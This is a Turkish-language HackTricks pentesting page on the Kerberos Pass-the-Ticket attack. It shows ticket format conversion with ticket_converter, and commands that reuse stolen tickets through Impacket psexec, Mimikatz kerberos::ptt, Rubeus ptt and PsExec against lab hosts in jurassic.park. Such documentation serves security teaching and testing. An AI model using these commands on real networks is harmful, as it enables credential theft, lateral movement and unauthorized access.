# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Genel Bakış

Pass-the-Ticket (PtT) saldırısında saldırgan, hesabın parolasına sahip olmadan biletin principal'ı olarak kimlik doğrulamak için çalınmış bir Kerberos bileti kullanır. Bir ticket-granting ticket (TGT), service ticket'ları istemek için kullanılabilirken çalınmış bir service ticket, hedef service ve geçerlilik süresiyle sınırlıdır.<sup>[[1]](#references)</sup>

Ticket edinme teknikleri için bkz.:

- [Windows'tan ticket toplama](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Linux'tan ticket toplama](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Linux ve Windows Ticket Formatlarını Dönüştürme

Kerberos cache'leri Linux'ta genellikle MIT `ccache` dosyaları, Windows'ta ise `.kirbi` dosyaları olarak görülür. `ticket_converter`, bir input ticket ve output path kullanarak bu formatlar arasında dönüşüm yapar.<sup>[[2]](#references)</sup>
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```
Kekeo ayrıca Windows üzerinde Kerberos ticket araçları sağlar.<sup>[[3]](#references)</sup>

## Ticket Kullanma

Linux'ta `KRB5CCNAME` değişkenini cache'e yönlendirin ve bir Impacket client'ına parola istemeden Kerberos kullanmasını söyleyin:<sup>[[4]](#references)</sup>
```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```
Windows'ta Mimikatz veya Rubeus, bir `.kirbi` ticket'ını mevcut logon oturumuna aktarabilir. Ortaya çıkan cache'i incelemek için `klist` kullanın.<sup>[[5]](#references)[[6]](#references)</sup>
```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
Ticket import, ticket tarafından temsil edilen ve hedef hizmetin yetkilendirme politikası tarafından izin verilen ayrıcalıkların ötesinde ayrıcalık sağlamaz. Süresi dolmuş, iptal edilmiş, hatalı biçimlendirilmiş veya kapsamı yanlış belirlenmiş ticket'lar başarısız olabilir.<sup>[[1]](#references)</sup>

Daha geniş Kerberos saldırısı bağlamı ve ilgili ticket edinme teknikleri için Tarlogic'in Kerberos saldırı kılavuzuna bakın.<sup>[[7]](#references)</sup>

## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - Impacket örnekleri](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Kerberos saldırı teknikleri](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
{{#include ../../banners/hacktricks-training.md}}
